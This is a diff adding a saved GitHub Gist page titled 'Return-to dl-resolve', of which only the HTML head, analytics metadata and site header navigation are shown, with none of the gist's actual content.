@@ -1,0 +1,1802 @@
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+  <link rel="dns-prefetch" href="https://github.githubassets.com">
+  <link rel="dns-prefetch" href="https://avatars0.githubusercontent.com">
+  <link rel="dns-prefetch" href="https://avatars1.githubusercontent.com">
+  <link rel="dns-prefetch" href="https://avatars2.githubusercontent.com">
+  <link rel="dns-prefetch" href="https://avatars3.githubusercontent.com">
+  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
+  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
+
+
+
+  <link crossorigin="anonymous" media="all" integrity="sha512-QV1ZNBjZz8stPx+uh4ZAKc6AJ1z8A9VHut/SGtgbc+iYLfhrh68QmDH3rZgkXJ0BWIOcDw+ILnWcctH0ljcHPg==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-415d593418d9cfcb2d3f1fae87864029.css" />
+  
+    <link crossorigin="anonymous" media="all" integrity="sha512-xGFdZUKK/onhRqT6o59o2xm+CbVkziehu3nWHXh3Es1mnZ1O5//h814bwszrOvVazsMd2gGccpTjBoH9bApQ7g==" rel="stylesheet" href="https://github.githubassets.com/assets/github-c4615d65428afe89e146a4faa39f68db.css" />
+    
+    
+    
+    
+
+
+  <meta name="viewport" content="width=device-width">
+  
+  <title>Return-to dl-resolve</title>
+    <meta name="description" content="Return-to dl-resolve. GitHub Gist: instantly share code, notes, and snippets.">
+    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch-gist.xml" title="Gist">
+  <link rel="fluid-icon" href="https://gist.github.com/fluidicon.png" title="GitHub">
+  <meta property="fb:app_id" content="1401488693436528">
+  <meta name="apple-itunes-app" content="app-id=1477376905">
+
+    <meta name="twitter:image:src" content="https://github.githubassets.com/images/modules/gists/gist-og-image.png" /><meta name="twitter:site" content="@github" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Return-to dl-resolve" /><meta name="twitter:description" content="Return-to dl-resolve. GitHub Gist: instantly share code, notes, and snippets." />
+    <meta property="og:image" content="https://github.githubassets.com/images/modules/gists/gist-og-image.png" /><meta property="og:site_name" content="Gist" /><meta property="og:type" content="article" /><meta property="og:title" content="Return-to dl-resolve" /><meta property="og:url" content="https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62" /><meta property="og:description" content="Return-to dl-resolve. GitHub Gist: instantly share code, notes, and snippets." /><meta property="article:author" content="262588213843476" /><meta property="article:publisher" content="262588213843476" />
+
+
+
+  
+
+  <link rel="assets" href="https://github.githubassets.com/">
+    <link rel="shared-web-socket" href="wss://alive.github.com/_sockets/u/55309735/ws?session=eyJ2IjoiVjMiLCJ1Ijo1NTMwOTczNSwicyI6NTU4MjM1NTE3LCJjIjoyMzcxOTA2NjU4LCJ0IjoxNjAyNTMzNTMyfQ==--de9854f384e380e4f6bc3cd6e2726743ce2efb91e92d583469e734914b5306b3" data-refresh-url="/_alive">
+  <link rel="sudo-modal" href="/sessions/sudo_modal">
+
+  <meta name="request-id" content="C04D:0D21:118263:19E217:5F84B89B" data-pjax-transient="true" /><meta name="html-safe-nonce" content="c2b22a677668c02cc601b21af570f9f78cf2a85c" data-pjax-transient="true" /><meta name="visitor-payload" content="eyJyZWZlcnJlciI6bnVsbCwicmVxdWVzdF9pZCI6IkMwNEQ6MEQyMToxMTgyNjM6MTlFMjE3OjVGODRCODlCIiwidmlzaXRvcl9pZCI6IjYxNDYzNzYyNzEyMzI4ODk3OTgiLCJyZWdpb25fZWRnZSI6ImFwLXNvdXRoZWFzdC0yIiwicmVnaW9uX3JlbmRlciI6ImlhZCJ9" data-pjax-transient="true" /><meta name="visitor-hmac" content="1f8b821f34b8053ceaeca5a770b2ddc49099b3e3a78247533561dde4ab314de3" data-pjax-transient="true" /><meta name="cookie-consent-required" content="false" />
+
+
+
+  <meta name="github-keyboard-shortcuts" content="" data-pjax-transient="true" />
+
+  
+
+  <meta name="selected-link" value="gist_code" data-pjax-transient>
+
+    <meta name="google-site-verification" content="c1kuD-K2HIVF635lypcsWPoD4kilo5-jA_wBFyT4uMY">
+  <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
+  <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
+  <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">
+
+  <meta name="octolytics-host" content="collector.githubapp.com" /><meta name="octolytics-app-id" content="gist" /><meta name="octolytics-event-url" content="https://collector.githubapp.com/github-external/browser_event" /><meta name="octolytics-dimension-ga_id" content="" class="js-octo-ga-id" /><meta name="octolytics-actor-id" content="55309735" /><meta name="octolytics-actor-login" content="wechicken456" /><meta name="octolytics-actor-hash" content="d4e84fbcd080a59c7c42bdecc30f13d9bf50ba9f6d1ac71f6ff2ad604647b109" />
+
+  <meta name="analytics-location" content="/&lt;user-name&gt;/&lt;gist-id&gt;" data-pjax-transient="true" />
+
+  
+
+
+
+
+
+    <meta name="google-analytics" content="UA-3769691-4">
+
+  <meta class="js-ga-set" name="userId" content="3f43d5c37d0e2e8b959a170923ec72e9">
+
+<meta class="js-ga-set" name="dimension10" content="Responsive" data-pjax-transient>
+
+<meta class="js-ga-set" name="dimension1" content="Logged In">
+
+
+
+    <meta name="octolytics-dimension-public" content="true" /><meta name="octolytics-dimension-gist_id" content="88814546" /><meta name="octolytics-dimension-gist_name" content="8c7f6f5b8950ed6771c1cd3a116f7e62" /><meta name="octolytics-dimension-anonymous" content="false" /><meta name="octolytics-dimension-owner_id" content="5010857" /><meta name="octolytics-dimension-owner_login" content="ricardo2197" /><meta name="octolytics-dimension-forked" content="false" />
+
+  <meta
+    class="js-ga-set"
+    name="dimension5"
+    content="public"
+  >
+  <meta
+    class="js-ga-set"
+    name="dimension6"
+    content="owned"
+  >
+  <meta
+    class="js-ga-set"
+    name="dimension7"
+    content="markdown"
+  >
+
+
+      <meta name="hostname" content="gist.github.com">
+    <meta name="user-login" content="wechicken456">
+
+
+      <meta name="expected-hostname" content="gist.github.com">
+
+      <meta name="js-proxy-site-detection-payload" content="NGRhYzNhZmVjMjhiODI3ODViYTUyNDRiMDEwOWFjOTNiM2NmNjEzYWQ3YzE4MDhiNjAwNDVlNDVmOTg4MmU4NXx7InJlbW90ZV9hZGRyZXNzIjoiMTAxLjE5MC4yOS43NyIsInJlcXVlc3RfaWQiOiJDMDREOjBEMjE6MTE4MjYzOjE5RTIxNzo1Rjg0Qjg5QiIsInRpbWVzdGFtcCI6MTYwMjUzMzUzMiwiaG9zdCI6ImdpdGh1Yi5jb20ifQ==">
+
+    <meta name="enabled-features" content="MARKETPLACE_PENDING_INSTALLATIONS,JS_HTTP_CACHE_HEADERS">
+
+  <meta http-equiv="x-pjax-version" content="e7188e69867cd35e131cc3bfc6d0aa14bc798308906964b75612d0e2084a5eb0">
+  
+
+      <link href="/ricardo2197.atom" rel="alternate" title="atom" type="application/atom+xml">
+
+  <link crossorigin="anonymous" media="all" integrity="sha512-1gJbq9JIy70vJx4U5Ob4XFozEVX2ckmp3JkNzcifWNVyWXvi0LoLzl/LO2PolgNyCFsz3SuHU2urSzTFGDGoPQ==" rel="stylesheet" href="https://github.githubassets.com/assets/gist-d6025babd248cbbd2f271e14e4e6f85c.css" />
+
+
+
+
+  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">
+
+  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">
+
+  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">
+  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
+  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">
+
+<meta name="theme-color" content="#1e2327">
+
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+  <meta name="apple-mobile-web-app-title" content="GitHub">
+
+
+  </head>
+
+  <body class="logged-in env-production page-responsive">
+    
+
+    <div class="position-relative js-header-wrapper ">
+      <a href="#start-of-content" class="p-3 bg-blue text-white show-on-focus js-skip-to-content">Skip to content</a>
+      <span class="progress-pjax-loader width-full js-pjax-loader-bar Progress position-fixed">
+    <span style="background-color: #79b8ff;width: 0%;" class="Progress-item progress-pjax-loader-bar "></span>
+</span>      
+      
+
+
+          <div class="Header js-details-container Details flex-wrap flex-md-nowrap p-responsive" role="banner" >
+  <div class="Header-item d-none d-md-flex">
+    <a class="Header-link" data-hotkey="g d" aria-label="Gist Homepage " href="/">
+  <svg class="octicon octicon-mark-github v-align-middle d-inline-block d-md-none" height="24" viewBox="0 0 16 16" version="1.1" width="24" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
+  <svg height="24" class="octicon octicon-logo-github v-align-middle d-none d-md-inline-block" viewBox="0 0 45 16" version="1.1" width="67" aria-hidden="true"><path fill-rule="evenodd" d="M18.53 12.03h-.02c.009 0 .015.01.024.011h.006l-.01-.01zm.004.011c-.093.001-.327.05-.574.05-.78 0-1.05-.36-1.05-.83V8.13h1.59c.09 0 .16-.08.16-.19v-1.7c0-.09-.08-.17-.16-.17h-1.59V3.96c0-.08-.05-.13-.14-.13h-2.16c-.09 0-.14.05-.14.13v2.17s-1.09.27-1.16.28c-.08.02-.13.09-.13.17v1.36c0 .11.08.19.17.19h1.11v3.28c0 2.44 1.7 2.69 2.86 2.69.53 0 1.17-.17 1.27-.22.06-.02.09-.09.09-.16v-1.5a.177.177 0 00-.146-.18zM42.23 9.84c0-1.81-.73-2.05-1.5-1.97-.6.04-1.08.34-1.08.34v3.52s.49.34 1.22.36c1.03.03 1.36-.34 1.36-2.25zm2.43-.16c0 3.43-1.11 4.41-3.05 4.41-1.64 0-2.52-.83-2.52-.83s-.04.46-.09.52c-.03.06-.08.08-.14.08h-1.48c-.1 0-.19-.08-.19-.17l.02-11.11c0-.09.08-.17.17-.17h2.13c.09 0 .17.08.17.17v3.77s.82-.53 2.02-.53l-.01-.02c1.2 0 2.97.45 2.97 3.88zm-8.72-3.61h-2.1c-.11 0-.17.08-.17.19v5.44s-.55.39-1.3.39-.97-.34-.97-1.09V6.25c0-.09-.08-.17-.17-.17h-2.14c-.09 0-.17.08-.17.17v5.11c0 2.2 1.23 2.75 2.92 2.75 1.39 0 2.52-.77 2.52-.77s.05.39.08.45c.02.05.09.09.16.09h1.34c.11 0 .17-.08.17-.17l.02-7.47c0-.09-.08-.17-.19-.17zm-23.7-.01h-2.13c-.09 0-.17.09-.17.2v7.34c0 .2.13.27.3.27h1.92c.2 0 .25-.09.25-.27V6.23c0-.09-.08-.17-.17-.17zm-1.05-3.38c-.77 0-1.38.61-1.38 1.38 0 .77.61 1.38 1.38 1.38.75 0 1.36-.61 1.36-1.38 0-.77-.61-1.38-1.36-1.38zm16.49-.25h-2.11c-.09 0-.17.08-.17.17v4.09h-3.31V2.6c0-.09-.08-.17-.17-.17h-2.13c-.09 0-.17.08-.17.17v11.11c0 .09.09.17.17.17h2.13c.09 0 .17-.08.17-.17V8.96h3.31l-.02 4.75c0 .09.08.17.17.17h2.13c.09 0 .17-.08.17-.17V2.6c0-.09-.08-.17-.17-.17zM8.81 7.35v5.74c0 .04-.01.11-.06.13 0 0-1.25.89-3.31.89-2.49 0-5.44-.78-5.44-5.92S2.58 1.99 5.1 2c2.18 0 3.06.49 3.2.58.04.05.06.09.06.14L7.94 4.5c0 .09-.09.2-.2.17-.36-.11-.9-.33-2.17-.33-1.47 0-3.05.42-3.05 3.73s1.5 3.7 2.58 3.7c.92 0 1.25-.11 1.25-.11v-2.3H4.88c-.11 0-.19-.08-.19-.17V7.35c0-.09.08-.17.19-.17h3.74c.11 0 .19.08.19.17z"></path></svg>
+  <svg height="24" class="octicon octicon-logo-gist v-align-middle d-none d-md-inline-block" viewBox="0 0 25 16" version="1.1" width="37" aria-hidden="true"><path fill-rule="evenodd" d="M4.7 8.73h2.45v4.02c-.55.27-1.64.34-2.53.34-2.56 0-3.47-2.2-3.47-5.05 0-2.85.91-5.06 3.48-5.06 1.28 0 2.06.23 3.28.73V2.66C7.27 2.33 6.25 2 4.63 2 1.13 2 0 4.69 0 8.03c0 3.34 1.11 6.03 4.63 6.03 1.64 0 2.81-.27 3.59-.64V7.73H4.7v1zm6.39 3.72V6.06h-1.05v6.28c0 1.25.58 1.72 1.72 1.72v-.89c-.48 0-.67-.16-.67-.7v-.02zm.25-8.72c0-.44-.33-.78-.78-.78s-.77.34-.77.78.33.78.77.78.78-.34.78-.78zm4.34 5.69c-1.5-.13-1.78-.48-1.78-1.17 0-.77.33-1.34 1.88-1.34 1.05 0 1.66.16 2.27.36v-.94c-.69-.3-1.52-.39-2.25-.39-2.2 0-2.92 1.2-2.92 2.31 0 1.08.47 1.88 2.73 2.08 1.55.13 1.77.63 1.77 1.34 0 .73-.44 1.42-2.06 1.42-1.11 0-1.86-.19-2.33-.36v.94c.5.2 1.58.39 2.33.39 2.38 0 3.14-1.2 3.14-2.41 0-1.28-.53-2.03-2.75-2.23h-.03zm8.58-2.47v-.86h-2.42v-2.5l-1.08.31v2.11l-1.56.44v.48h1.56v5c0 1.53 1.19 2.13 2.5 2.13.19 0 .52-.02.69-.05v-.89c-.19.03-.41.03-.61.03-.97 0-1.5-.39-1.5-1.34V6.94h2.42v.02-.01z"></path></svg>
+</a>
+  </div>
+
+  <div class="Header-item d-md-none">
+    <button class="Header-link btn-link js-details-target" type="button" aria-label="Toggle navigation" aria-expanded="false">
+      <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24" aria-hidden="true"><path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z"></path></svg>
+    </button>
+  </div>
+
+  <div class="Header-item Header-item--full js-site-search flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+        <div class="header-search header-search-current flex-self-stretch flex-md-self-auto mr-0 mr-md-3 mb-3 mb-md-0">
+    <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="position-relative js-quicksearch-form" role="search" aria-label="Site" action="/search" accept-charset="UTF-8" method="get">
+      <div class="header-search-wrapper form-control input-sm js-chromeless-input-container">
+        <input type="text"
+          class="form-control input-sm js-site-search-focus header-search-input js-navigation-enable js-quicksearch-field"
+          data-hotkey="s,/"
+          name="q"
+          aria-label="Search"
+          placeholder="Search…"
+          autocorrect="off"
+          autocomplete="off"
+          autocapitalize="off">
+      </div>
+
+        <div class="gist-quicksearch-results js-quicksearch-results js-navigation-container" data-quicksearch-url="/search/quick"></div>
+</form>  </div>
+
+
+    <nav aria-label="Global" class="d-flex flex-column flex-md-row flex-self-stretch flex-md-self-auto">
+  <a class="Header-link mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade-15" data-ga-click="Header, go to all gists, text:all gists" href="/discover">All gists</a>
+
+  <a class="Header-link mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade-15" data-ga-click="Header, go to GitHub, text:Back to GitHub" href="https://github.com">Back to GitHub</a>
+
+
+
+    <a class="Header-link d-block d-md-none mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade-15" aria-label="View profile and more" aria-expanded="false" aria-haspopup="false" href="/wechicken456">
+      <img class="avatar avatar-user" src="https://avatars0.githubusercontent.com/u/55309735?s=40&amp;v=4" width="20" height="20" alt="@wechicken456" />
+      wechicken456
+</a>
+    <!-- '"` --><!-- </textarea></xmp> --></option></form><form action="https://gist.github.com/auth/github/logout" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="w4OBQBT4Wka/ejtiCMbTQgKOfPbP9olw4Q1F2QN2r05vaUBFuCzyb2Fi60LJnA0dZdUPbrPYsC06DkS2gxPXUw==" />
+      <button type="submit" class="Header-link mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade-15 d-md-none btn-link d-block width-full text-left" data-ga-click="Header, sign out, icon:logout" style="padding-left: 2px;">
+        <svg class="octicon octicon-sign-out v-align-middle" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M2 2.75C2 1.784 2.784 1 3.75 1h2.5a.75.75 0 010 1.5h-2.5a.25.25 0 00-.25.25v10.5c0 .138.112.25.25.25h2.5a.75.75 0 010 1.5h-2.5A1.75 1.75 0 012 13.25V2.75zm10.44 4.5H6.75a.75.75 0 000 1.5h5.69l-1.97 1.97a.75.75 0 101.06 1.06l3.25-3.25a.75.75 0 000-1.06l-3.25-3.25a.75.75 0 10-1.06 1.06l1.97 1.97z"></path></svg>
+        Sign out
+      </button>
+</form></nav>
+
+  </div>
+
+  <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+    <a class="Header-link" data-hotkey="g d" aria-label="Gist Homepage " href="/">
+  <svg class="octicon octicon-mark-github v-align-middle d-inline-block d-md-none" height="24" viewBox="0 0 16 16" version="1.1" width="24" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
+  <svg height="24" class="octicon octicon-logo-github v-align-middle d-none d-md-inline-block" viewBox="0 0 45 16" version="1.1" width="67" aria-hidden="true"><path fill-rule="evenodd" d="M18.53 12.03h-.02c.009 0 .015.01.024.011h.006l-.01-.01zm.004.011c-.093.001-.327.05-.574.05-.78 0-1.05-.36-1.05-.83V8.13h1.59c.09 0 .16-.08.16-.19v-1.7c0-.09-.08-.17-.16-.17h-1.59V3.96c0-.08-.05-.13-.14-.13h-2.16c-.09 0-.14.05-.14.13v2.17s-1.09.27-1.16.28c-.08.02-.13.09-.13.17v1.36c0 .11.08.19.17.19h1.11v3.28c0 2.44 1.7 2.69 2.86 2.69.53 0 1.17-.17 1.27-.22.06-.02.09-.09.09-.16v-1.5a.177.177 0 00-.146-.18zM42.23 9.84c0-1.81-.73-2.05-1.5-1.97-.6.04-1.08.34-1.08.34v3.52s.49.34 1.22.36c1.03.03 1.36-.34 1.36-2.25zm2.43-.16c0 3.43-1.11 4.41-3.05 4.41-1.64 0-2.52-.83-2.52-.83s-.04.46-.09.52c-.03.06-.08.08-.14.08h-1.48c-.1 0-.19-.08-.19-.17l.02-11.11c0-.09.08-.17.17-.17h2.13c.09 0 .17.08.17.17v3.77s.82-.53 2.02-.53l-.01-.02c1.2 0 2.97.45 2.97 3.88zm-8.72-3.61h-2.1c-.11 0-.17.08-.17.19v5.44s-.55.39-1.3.39-.97-.34-.97-1.09V6.25c0-.09-.08-.17-.17-.17h-2.14c-.09 0-.17.08-.17.17v5.11c0 2.2 1.23 2.75 2.92 2.75 1.39 0 2.52-.77 2.52-.77s.05.39.08.45c.02.05.09.09.16.09h1.34c.11 0 .17-.08.17-.17l.02-7.47c0-.09-.08-.17-.19-.17zm-23.7-.01h-2.13c-.09 0-.17.09-.17.2v7.34c0 .2.13.27.3.27h1.92c.2 0 .25-.09.25-.27V6.23c0-.09-.08-.17-.17-.17zm-1.05-3.38c-.77 0-1.38.61-1.38 1.38 0 .77.61 1.38 1.38 1.38.75 0 1.36-.61 1.36-1.38 0-.77-.61-1.38-1.36-1.38zm16.49-.25h-2.11c-.09 0-.17.08-.17.17v4.09h-3.31V2.6c0-.09-.08-.17-.17-.17h-2.13c-.09 0-.17.08-.17.17v11.11c0 .09.09.17.17.17h2.13c.09 0 .17-.08.17-.17V8.96h3.31l-.02 4.75c0 .09.08.17.17.17h2.13c.09 0 .17-.08.17-.17V2.6c0-.09-.08-.17-.17-.17zM8.81 7.35v5.74c0 .04-.01.11-.06.13 0 0-1.25.89-3.31.89-2.49 0-5.44-.78-5.44-5.92S2.58 1.99 5.1 2c2.18 0 3.06.49 3.2.58.04.05.06.09.06.14L7.94 4.5c0 .09-.09.2-.2.17-.36-.11-.9-.33-2.17-.33-1.47 0-3.05.42-3.05 3.73s1.5 3.7 2.58 3.7c.92 0 1.25-.11 1.25-.11v-2.3H4.88c-.11 0-.19-.08-.19-.17V7.35c0-.09.08-.17.19-.17h3.74c.11 0 .19.08.19.17z"></path></svg>
+  <svg height="24" class="octicon octicon-logo-gist v-align-middle d-none d-md-inline-block" viewBox="0 0 25 16" version="1.1" width="37" aria-hidden="true"><path fill-rule="evenodd" d="M4.7 8.73h2.45v4.02c-.55.27-1.64.34-2.53.34-2.56 0-3.47-2.2-3.47-5.05 0-2.85.91-5.06 3.48-5.06 1.28 0 2.06.23 3.28.73V2.66C7.27 2.33 6.25 2 4.63 2 1.13 2 0 4.69 0 8.03c0 3.34 1.11 6.03 4.63 6.03 1.64 0 2.81-.27 3.59-.64V7.73H4.7v1zm6.39 3.72V6.06h-1.05v6.28c0 1.25.58 1.72 1.72 1.72v-.89c-.48 0-.67-.16-.67-.7v-.02zm.25-8.72c0-.44-.33-.78-.78-.78s-.77.34-.77.78.33.78.77.78.78-.34.78-.78zm4.34 5.69c-1.5-.13-1.78-.48-1.78-1.17 0-.77.33-1.34 1.88-1.34 1.05 0 1.66.16 2.27.36v-.94c-.69-.3-1.52-.39-2.25-.39-2.2 0-2.92 1.2-2.92 2.31 0 1.08.47 1.88 2.73 2.08 1.55.13 1.77.63 1.77 1.34 0 .73-.44 1.42-2.06 1.42-1.11 0-1.86-.19-2.33-.36v.94c.5.2 1.58.39 2.33.39 2.38 0 3.14-1.2 3.14-2.41 0-1.28-.53-2.03-2.75-2.23h-.03zm8.58-2.47v-.86h-2.42v-2.5l-1.08.31v2.11l-1.56.44v.48h1.56v5c0 1.53 1.19 2.13 2.5 2.13.19 0 .52-.02.69-.05v-.89c-.19.03-.41.03-.61.03-.97 0-1.5-.39-1.5-1.34V6.94h2.42v.02-.01z"></path></svg>
+</a>
+  </div>
+
+
+    
+
+    <notification-indicator class="Header-item js-socket-channel" data-channel="eyJjIjoibm90aWZpY2F0aW9uLWNoYW5nZWQ6NTUzMDk3MzUiLCJ0IjoxNjAyNTMzNTMyfQ==--1cf8e24d9ab5ca9054edd586100be49438e093be74e0aa9688c9eb6882a54f38">
+      <a href="https://github.com/notifications"
+         class="Header-link notification-indicator position-relative tooltipped tooltipped-s"
+         aria-label="You have no unread notifications"
+         data-hotkey="g n"
+         data-ga-click="Header, go to notifications, icon:read"
+         data-target="notification-indicator.link">
+         <span class="mail-status  " data-target="notification-indicator.modifier"></span>
+         <svg class="octicon octicon-bell" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M8 16a2 2 0 001.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 008 16z"></path><path fill-rule="evenodd" d="M8 1.5A3.5 3.5 0 004.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.018.018 0 00-.003.01l.001.006c0 .002.002.004.004.006a.017.017 0 00.006.004l.007.001h10.964l.007-.001a.016.016 0 00.006-.004.016.016 0 00.004-.006l.001-.007a.017.017 0 00-.003-.01l-1.703-2.554a1.75 1.75 0 01-.294-.97V5A3.5 3.5 0 008 1.5zM3 5a5 5 0 0110 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.518 1.518 0 0113.482 13H2.518a1.518 1.518 0 01-1.263-2.36l1.703-2.554A.25.25 0 003 7.947V5z"></path></svg>
+      </a>
+    </notification-indicator>
+
+
+    <div class="Header-item mr-0 mr-md-3">
+      <a class="Header-link" data-ga-click="Header, go to new gist, text:new gist" aria-label="Create new gist" href="/">
+        <svg class="octicon octicon-plus d-md-none" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 2a.75.75 0 01.75.75v4.5h4.5a.75.75 0 010 1.5h-4.5v4.5a.75.75 0 01-1.5 0v-4.5h-4.5a.75.75 0 010-1.5h4.5v-4.5A.75.75 0 018 2z"></path></svg>
+        <svg class="octicon octicon-plus d-none d-md-inline-block" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 2a.75.75 0 01.75.75v4.5h4.5a.75.75 0 010 1.5h-4.5v4.5a.75.75 0 01-1.5 0v-4.5h-4.5a.75.75 0 010-1.5h4.5v-4.5A.75.75 0 018 2z"></path></svg>
+</a>    </div>
+
+    <div class="Header-item position-relative mr-0 d-none d-md-flex" id="user-links">
+
+      <details class="details-overlay details-reset">
+        <summary class="Header-link name"
+          aria-label="View profile and more"
+          data-ga-click="Header, show menu, icon:avatar">
+          <img class="avatar avatar-user" src="https://avatars0.githubusercontent.com/u/55309735?s=40&amp;v=4" width="20" height="20" alt="@wechicken456" />
+          <span class="dropdown-caret"></span>
+        </summary>
+        <details-menu class="dropdown-menu dropdown-menu-sw" style="width: 180px">
+          <div class="css-truncate"><a role="menuitem" class="text-gray-dark  no-underline px-3 pt-2 pb-2 mb-n2 mt-n1 d-block" href="/wechicken456" data-ga-click="Header, go to profile, text:Signed in as">Signed in as <strong class="css-truncate-target">wechicken456</strong></a></div>
+          <div role="none" class="dropdown-divider"></div>
+          <a role="menuitem" class="dropdown-item" href="/wechicken456" data-ga-click="Header, go to your gists, text:your gists">Your gists</a>
+          <a role="menuitem" class="dropdown-item" href="/wechicken456/starred" data-ga-click="Header, go to starred gists, text:starred gists">Starred gists</a>
+          <a role="menuitem" class="dropdown-item" href="https://docs.github.com" data-ga-click="Header, go to help, text:help">Help</a>
+          <div role="none" class="dropdown-divider"></div>
+          <a role="menuitem" class="dropdown-item" href="https://github.com/wechicken456" data-ga-click="Header, go to profile, text:your profile">Your GitHub profile</a>
+          <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="logout-form" action="https://gist.github.com/auth/github/logout" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="28Z5DZjAsFgBgTHc0bPvLQUeze2CO+2V9XRV7Ai/HRd3LLgINBQYcd+Z4fwQ6TFyYkW+df4V1Mgud1SDiNplCg==" />
+            <button type="submit" class="dropdown-item dropdown-signout" data-ga-click="Header, sign out, icon:logout" role="menuitem">
+              Sign out
+            </button>
+</form>        </details-menu>
+      </details>
+    </div>
+</div>
+
+
+
+          
+
+    </div>
+
+  <div id="start-of-content" class="show-on-focus"></div>
+
+
+
+
+
+    <div data-pjax-replace id="js-flash-container">
+
+
+  <template class="js-flash-template">
+    <div class="flash flash-full  {{ className }}">
+  <div class="container-lg px-2" >
+    <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
+      <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
+    </button>
+    
+      <div>{{ message }}</div>
+
+  </div>
+</div>
+  </template>
+</div>
+
+
+  
+
+  <include-fragment class="js-notification-shelf-include-fragment" data-base-src="https://github.com/notifications/beta/shelf"></include-fragment>
+
+
+
+  <div
+    class="application-main "
+    data-commit-hovercards-enabled
+    data-discussion-hovercards-enabled
+    data-issue-and-pr-hovercards-enabled
+  >
+        <div itemscope itemtype="http://schema.org/Code">
+    <main id="gist-pjax-container" data-pjax-container>
+      
+
+
+
+
+<div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+  <div class="px-0">
+    
+  
+
+<div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
